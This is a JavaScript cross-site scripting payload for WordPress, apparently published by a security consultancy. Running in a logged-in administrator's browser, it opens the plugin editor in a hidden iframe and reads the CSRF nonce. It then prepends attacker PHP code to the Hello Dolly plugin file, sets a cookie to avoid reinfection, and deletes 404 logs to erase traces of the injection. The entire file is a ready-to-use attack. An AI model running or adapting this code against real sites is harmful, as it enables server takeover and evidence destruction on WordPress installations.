// WordPress Core Payload
// Author: Hans-Michael Varbaek
// Company: Sense of Security
// Version: 1.2
// Credits: InterN0T
//
// Usage Notes:
// -- The hello.php plugin does not need to be activated within WordPress
//    However, it does need to be present and writeable
//
// Updates:
// -- This version uses XMLHttpRequest and FormData
// -- This version injects into the Hello Dolly plugin
//
// Compatibility Notes:
// -- Very old browsers won't support FormData() and XMLHttpRequest()
//
// Requirements: 
// 1) Ability to edit plugin files. (Default feature. However, this is typically disabled in hardened configurations.)
//
// Tested Browser:
// Chrome (latest version - 14 Nov 2015)
// 
// For ethical and legal purposes only. This script is provided as is and without warranty.


var php_input = '<?php PHP_PAYLOAD /* ?>'; // This payload comments out any subsequent PHP code

// Our iframe function which primarily injects a prepopulated form
function silent_plugins_inject() {
   if (document.cookie.indexOf("Plugins_Infected") == -1) {

   // Read and save the relevant _wpnonce - Bypass CSRF protection
   var plugin_wpnonce = document.getElementById('silent_plugins_frame').contentDocument.getElementById('template')._wpnonce.value; // WP Nonce / CSRF Token
   var plugin_contents = document.getElementById('silent_plugins_frame').contentDocument.getElementsByTagName('textarea')[0].value; // Current contents of the file

   // Initiate the form data object
   var formData = new FormData();

   // Create a variable which holds our PHP payload, a new line (Windows format), and then the current plugin data
   var special_content = php_input+'\r\n'+plugin_contents

   // Prepopulated form with the CSRF (wp_nonce) token and our PHP payload variables specified
   formData.append("_wpnonce", plugin_wpnonce);
   formData.append("_wp_http_referer", "%2Fwp-admin%2Fplugin-editor.php%3Ffile%3Dhello.php");
   formData.append("newcontent", special_content);
   formData.append("action", "update");
   formData.append("file", "hello.php");
   formData.append("theme", ""); // This variable name is probably not needed and also incorrect. However, it does not break our payload.
   formData.append("scrollto", "0");
   formData.append("docs-list", "");

   // Initiate XMLHttpRequest
   var request = new XMLHttpRequest();

   // Method and URL to send the request to
   request.open("POST", "http://TARGETWEBSITE/wp-admin/plugin-editor.php"); // This variable needs to be dynamic in the next version.
   // Example contents: http://www.some-wordpress-website.tld/wp-admin/plugin-editor.php

   // Send the request with our form data
   request.send(formData);

   SetCookie("Plugins_Infected","true"); // Prevent re-infection / loops
   clean_up();

   }
}


// ============================================= FUNCTIONS START ============================================= \\

// Injects the main hidden iframe into the page
// USAGE: main_frame_inject("Plugins_Infected","silent_plugins_frame","silent_plugins_inject()","plugin-editor.php?file=hello.php");
function main_frame_inject(cookiename,identifier,function_name,get_page) {
   if (document.cookie.indexOf(cookiename) == -1) {

      // Append a (hidden) iframe to the HTML body for data injection
      var mainframe = document.createElement("iframe");
      mainframe.setAttribute('id',identifier);
      top.document.body.appendChild(mainframe);
      mainframe.setAttribute('onload',function_name);
      mainframe.setAttribute('style','visibility:hidden;display:none');
      mainframe.setAttribute('src',get_page);
   }
}

// Sets a cookie with a very long expiration time
// USAGE: SetCookie("Plugins_Infected","true");
function SetCookie(cookieName,cookieContent) {
   var cookiePath = '/';
   var expDate=new Date();
   expDate.setTime(expDate.getTime()+372800000);
   var expires=expDate.toGMTString();
   document.cookie=cookieName+"="+escape(cookieContent)+";path="+escape(cookiePath)+";expires="+expires;
}

// NOTE: This function should always be executed after the final stage
// Delete all 404 log errors - Including the injected payload(s)
// This function is specific to the Better WP Security XSS issue
// USAGE: clean_up()
function clean_up() {
   document.getElementById('404s').checked=true;
   document.forms[0].submit();
}

// ============================================= FUNCTIONS END ============================================= \\

// USAGE: main_frame_inject("Plugins_Infected","silent_plugins_frame","silent_plugins_inject()","plugin-editor.php?file=hello.php");
// function main_frame_inject(cookiename,identifier,function_name,get_page)
main_frame_inject("Plugins_Infected","silent_plugins_frame","silent_plugins_inject()","plugin-editor.php?file=hello.php");


// PAYLOAD END